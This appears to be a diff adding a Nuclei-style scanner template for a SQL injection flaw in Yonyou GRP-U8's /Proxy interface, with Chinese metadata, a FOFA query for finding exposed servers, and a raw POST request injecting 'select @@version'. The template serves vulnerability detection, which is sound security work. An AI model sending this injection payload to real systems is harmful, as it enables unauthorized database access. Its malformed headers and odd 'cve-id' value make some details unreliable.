@@ -1,0 +1,42 @@
+id: 2024-105091430
+
+info:
+  name: 用友GRP-U8内控管理软件Proxy接口存在SQL注入漏洞
+  author: k3ppf0r
+  severity: high
+  description: |
+    用友政务公司获知用友GRP-U8内控管理软件SQL注入漏洞后，第一时间组织团队进行应急响应，分析处理漏洞问题并发布相关解决补丁，并对相关支持人员进行培训。本次漏洞利用Proxy接口（所有通过Proxy接口进行通讯的），传入注入的SQL语句，正常返回了数据信息，存在一定的安全隐患。
+  reference:
+    - https://github.com/wy876/POC/blob/437fad5c987d7a15441fd5e05cb793b08181809b/%E7%94%A8%E5%8F%8BNC-bill%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+    - https://security.yonyou.com/#/noticeInfo?id=544
+  remediation: |
+    需要首先更新U8Manager产品2023年7月份(或大于此日期）产品补丁，只更新本次安全补丁不能起到作用。
+  classification:
+    cve-id: 2024-105091430
+    cvss-score: 7.5
+    cwe-id: CWE-89
+  metadata:
+    date: 2024-02-22
+    version: 用友GRP-U8R10产品官方在售及提供服务的版本为U8Manager，产品分B、C、G三个产品系列，以上受到本次通报漏洞的影响。
+    fofa-query: app="用友-GRP-U8"
+  tags: yonyou,sqli,1day,yonyounc,ncu8
+
+
+http:
+  - raw:
+      - |
+        @timeout: 25s
+        POST /Proxy HTTP/1.1
+        Accept: Accept: */*
+        Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host
+        Content-Length: 357
+        Connection: Keep-Alive
+        Cache-Control: no-cache
+
+        cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format="text">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==500'
+          - 'contains(body, "<SESSIONID>") || contains(body, "ERROR")'
